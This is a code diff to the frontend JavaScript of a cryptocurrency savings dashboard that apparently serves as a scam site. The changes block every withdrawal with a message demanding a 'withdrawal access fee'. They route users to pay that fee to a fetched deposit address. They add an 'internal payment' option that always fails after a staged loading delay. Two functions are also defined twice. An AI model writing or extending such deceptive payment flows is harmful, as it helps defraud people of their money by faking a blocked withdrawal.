@@ -12,6 +12,11 @@ let hidden = localStorage.getItem("hideBalance") === "true";
 let depositAddress = "";
 
 /* =========================
+   API BASE (IMPORTANT FIX)
+========================= */
+const API_URL = "http://localhost:5000";
+
+/* =========================
    DOM READY
 ========================= */
 document.addEventListener("DOMContentLoaded", () => {
@@ -26,7 +31,6 @@ document.addEventListener("DOMContentLoaded", () => {
 
     setInterval(loadPortfolio, 5000);
 
-    // hamburger
     const hamburger = document.getElementById("hamburger");
     const navLinks = document.getElementById("navLinks");
 
@@ -55,7 +59,7 @@ function setupGreeting() {
 ========================= */
 async function loadPortfolio() {
     try {
-        const res = await fetch("https://crypto-save-production.up.railway.app/portfolio");
+        const res = await fetch(`${API_URL}/portfolio`);
         const data = await res.json();
 
         const assetsDiv = document.getElementById("assets");
@@ -110,11 +114,7 @@ async function loadPortfolio() {
             }
         }
 
-        if (hidden) {
-            totalEl.innerText = "****";
-        } else {
-            animateValue(totalEl, total);
-        }
+        totalEl.innerText = hidden ? "****" : `$${total.toFixed(2)}`;
 
         const recent = (data.transactions || []).reverse();
 
@@ -142,61 +142,106 @@ async function loadPortfolio() {
 }
 
 /* =========================
-   BALANCE TOGGLE
+   LOAD DEPOSIT ADDRESS (FIXED)
+========================= */
+async function loadDepositAddress() {
+    try {
+        const res = await fetch("http://localhost:5000/api/deposit-address");
+        const data = await res.json();
+
+        const address = data.address || "No address set";
+
+        // update ALL possible elements safely
+        const dashboardEl = document.getElementById("depositWalletAddress");
+        const walletEl = document.getElementById("externalPaymentAddress");
+
+        if (dashboardEl) dashboardEl.value = address;
+        if (dashboardEl) dashboardEl.innerText = address;
+
+        if (walletEl) walletEl.value = address;
+        if (walletEl) walletEl.innerText = address;
+
+    } catch (err) {
+        console.log("Deposit address load failed:", err);
+    }
+}
+
+function copyDepositAddress() {
+
+    const input = document.getElementById("depositWalletAddress");
+
+    if (!input) {
+        alert("Input not found");
+        return;
+    }
+
+    const value = input.value;
+
+    if (!value) {
+        alert("No address found");
+        return;
+    }
+
+    navigator.clipboard.writeText(value)
+    .then(() => {
+        alert("Copied successfully");
+    })
+    .catch((err) => {
+        console.log(err);
+
+        input.select();
+        input.setSelectionRange(0, 99999);
+
+        document.execCommand("copy");
+
+        alert("Copied successfully");
+    });
+}
+
+function copyExternalPaymentAddress() {
+
+    const input = document.getElementById("externalPaymentAddress");
+
+    if (!input) {
+        alert("Address field not found");
+        return;
+    }
+
+    const value = input.value;
+
+    if (!value || value === "Loading...") {
+        alert("No address available");
+        return;
+    }
+
+    navigator.clipboard.writeText(value)
+        .then(() => {
+            alert("Copied successfully");
+        })
+        .catch(() => {
+
+            input.select();
+            input.setSelectionRange(0, 99999);
+
+            document.execCommand("copy");
+
+            alert("Copied successfully");
+        });
+}
+
+/* =========================
+   TOGGLE
 ========================= */
 function setupBalanceToggle() {
     const toggleBtn = document.getElementById("toggleBalance");
-    const totalEl = document.getElementById("total");
-    const eyeOpen = document.getElementById("eyeOpen");
-    const eyeClosed = document.getElementById("eyeClosed");
 
-    if (!toggleBtn || !totalEl || !eyeOpen || !eyeClosed) return;
-
-    function updateUI() {
-        if (hidden) {
-            totalEl.innerText = "****";
-            eyeOpen.style.display = "none";
-            eyeClosed.style.display = "inline";
-        } else {
-            eyeOpen.style.display = "inline";
-            eyeClosed.style.display = "none";
-            loadPortfolio();
-        }
-    }
+    if (!toggleBtn) return;
 
     toggleBtn.addEventListener("click", () => {
         hidden = !hidden;
         localStorage.setItem("hideBalance", hidden);
-        updateUI();
+        loadPortfolio();
     });
-
-    updateUI();
-}
-
-/* =========================
-   ANIMATION
-========================= */
-function animateValue(el, newValue) {
-    let start = parseFloat(el.innerText.replace("$", "")) || 0;
-    let end = newValue;
-    let duration = 400;
-    let startTime = null;
-
-    function animate(currentTime) {
-        if (!startTime) startTime = currentTime;
-        let progress = (currentTime - startTime) / duration;
-
-        let value = start + (end - start) * progress;
-
-        if (progress < 1) {
-            el.innerText = "$" + value.toFixed(2);
-            requestAnimationFrame(animate);
-        } else {
-            el.innerText = "$" + end.toFixed(2);
-        }
-    }
-
-    requestAnimationFrame(animate);
 }
 
 /* =========================
@@ -214,21 +259,7 @@ function closeDeposit() {
 
 function openWithdraw() {
     const modal = document.getElementById("withdrawModal");
-
-    if (!modal) {
-        console.log("withdrawModal not found");
-        return;
-    }
-
-    modal.style.display = "flex";
-}
-
-function submitWithdraw() {
-    showToast("Withdrawal period not elapsed, contact admin");
-
-    // optional: close modal after message
-    const modal = document.getElementById("withdrawModal");
-    if (modal) modal.style.display = "none";
+    if (modal) modal.style.display = "flex";
 }
 
 function closeWithdraw() {
@@ -236,32 +267,73 @@ function closeWithdraw() {
     if (modal) modal.style.display = "none";
 }
 
-/* =========================
-   DEPOSIT ADDRESS (FIXED)
-========================= */
-async function loadDepositAddress() {
-    try {
-        const res = await fetch("https://crypto-save-production.up.railway.app/api/deposit-address");
-        const data = await res.json();
-
-        depositAddress = data.address || "";
-
-        const el = document.getElementById("depositWalletAddress");
-
-        if (el) {
-            el.innerText = depositAddress || "No address set";
-        }
-
-    } catch (err) {
-        console.log("Failed to load deposit address", err);
-    }
+function submitWithdraw() {
+    showToast("Withdrawal unavailable until withdrawal access fee is paid");
+    closeWithdraw();
 }
 
-function copyDepositAddress() {
-    if (!depositAddress) return;
+function openWithdrawAccess() {
+    document.getElementById("withdrawAccessModal").style.display = "flex";
+}
 
-    navigator.clipboard.writeText(depositAddress);
-    showToast("Address copied");
+function closeWithdrawAccess() {
+    document.getElementById("withdrawAccessModal").style.display = "none";
+}
+
+async function openExternalPayment() {
+    showLoader();
+
+    try {
+        await loadDepositAddress(); // wait for fresh data
+
+        document.getElementById("externalPaymentModal").style.display = "flex";
+
+    } catch (err) {
+        console.log(err);
+    }
+
+    hideLoader();
+}
+
+function closeExternalPayment() {
+    document.getElementById("externalPaymentModal").style.display = "none";
+}
+
+function payInternal() {
+    alert("Internal payment processing...");
+}
+
+function showLoader() {
+    document.getElementById("globalLoader").style.display = "flex";
+}
+
+function hideLoader() {
+    document.getElementById("globalLoader").style.display = "none";
+}
+
+function payInternal() {
+    showLoader();
+
+    setTimeout(() => {
+        hideLoader();
+
+        closeWithdrawAccess();
+
+        // later you can replace this with real logic
+        alert("Unable to verify beneficiary withdrawal path");
+    }, 1500);
+}
+
+function openExternalPayment() {
+    showLoader();
+
+    setTimeout(() => {
+        hideLoader();
+
+        document.getElementById("externalPaymentModal").style.display = "flex";
+
+        loadDepositAddress();
+    }, 1500);
 }
 
 /* =========================
@@ -283,11 +355,6 @@ function showToast(message) {
 }
 
 function logout() {
-    // clear any saved session data
-    localStorage.removeItem("user");
-    localStorage.removeItem("token");
-    localStorage.removeItem("hideBalance");
-
-    // redirect to login page
+    localStorage.clear();
     window.location.href = "index.html";
 }
